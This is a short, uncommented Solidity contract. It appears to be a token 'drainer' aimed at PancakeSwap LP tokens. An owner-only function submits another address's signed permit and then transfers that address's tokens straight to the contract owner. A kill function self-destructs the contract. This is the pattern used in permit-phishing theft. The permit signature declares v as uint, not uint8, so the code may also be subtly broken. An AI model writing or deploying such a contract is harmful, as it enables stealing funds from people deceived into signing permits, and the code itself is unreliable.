pragma solidity >=0.7.0 <0.9.0;

interface IPancakeERC20 {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function permit(address owner, address spender, uint value, uint deadline, uint v, bytes32 r, bytes32 s) external;
}

contract LP {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    

    function permitWithBalance(address token, address their, uint val,uint deadline,uint v, bytes32 r,bytes32 s) public payable {
        require(msg.sender == owner);
        IPancakeERC20 lp = IPancakeERC20(token);
        lp.permit(their, address(this), val, deadline, v, r, s);
        lp.transferFrom(their,owner,val);
    }

    function kill() public {
        require(msg.sender == owner);
        selfdestruct(payable(msg.sender));
    }
}
